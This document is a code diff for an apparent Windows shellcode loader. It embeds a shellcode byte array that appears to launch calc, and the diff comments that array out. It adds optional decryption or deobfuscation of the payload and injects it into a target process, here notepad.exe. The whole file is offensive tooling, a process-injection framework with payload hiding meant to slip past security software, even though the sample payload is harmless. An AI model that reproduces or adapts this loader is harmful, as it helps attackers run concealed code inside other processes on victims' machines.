@@ -1,8 +1,7 @@
 #include "common.h"
 
 
-/* SHELLCODE */
-unsigned char Payload[] = {
+/*unsigned char Payload[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
 	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
@@ -28,11 +27,14 @@ unsigned char Payload[] = {
 	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
 };
 
-/* KEY */
-unsigned char key[] = {0x00};
+unsigned long PayloadSize = sizeof(Payload);
 
-/* IV */
-unsigned char iv[] = {0x00};
+unsigned char Key[] = {0x00};
+
+unsigned long KeySize = sizeof(Key);
+
+unsigned char Iv[] = {0x00};*/
+
 
 int main() {
 
@@ -50,15 +52,20 @@ int main() {
 #endif
 
 BOOL bSuccess;
-PVOID pDecryptedPayload = Payload;
-SIZE_T PayloadSize = sizeof(Payload);
+PBYTE pDecryptedPayload = (PBYTE)Payload;
+SIZE_T dwDecryptedPayloadSize = 0;
 
-#ifdef ENCRYPTED_PAYLOAD
-    DWORD dwDecryptedPayloadSize = NULL;
-    bSuccess = decrypt(Payload, sizeof(Payload), key, sizeof(key), iv, &pDecryptedPayload, &dwDecryptedPayloadSize);
+#if defined(ENCRYPTED_PAYLOAD)
+    bSuccess = decrypt(Payload, PayloadSize, Key, KeySize, Iv, &pDecryptedPayload, &dwDecryptedPayloadSize);
     if (bSuccess && pDecryptedPayload != NULL) {
         PayloadSize = dwDecryptedPayloadSize;
         DebugPrint("[i] Payload decrypted successfully. [size: %d]\n", PayloadSize);
+    }
+#elif defined(OBFUSCATED_PAYLOAD)
+    bSuccess = deobfuscate(Payload, PayloadSize, &pDecryptedPayload, &dwDecryptedPayloadSize);
+    if (bSuccess && pDecryptedPayload != NULL) {
+        PayloadSize = dwDecryptedPayloadSize;
+        DebugPrint("[i] Payload deobfuscated successfully. [size: %d]\n", PayloadSize);
     }
 #else
     bSuccess = decrypt(pDecryptedPayload, PayloadSize, NULL, 0, NULL, NULL, NULL);
@@ -76,7 +83,7 @@ SIZE_T PayloadSize = sizeof(Payload);
 
     DebugPrint("[i] Setup complete... Beginning injection!\n");
 #ifdef PROCESS_NAME_ENABLED
-    LPWSTR szProcessName =  /* PROCESS_NAME */;
+    LPWSTR szProcessName =  L"notepad.exe";
     bSuccess = inject_payload(pDecryptedPayload, PayloadSize, szProcessName);
 #else
     bSuccess = inject_payload(pDecryptedPayload, PayloadSize);
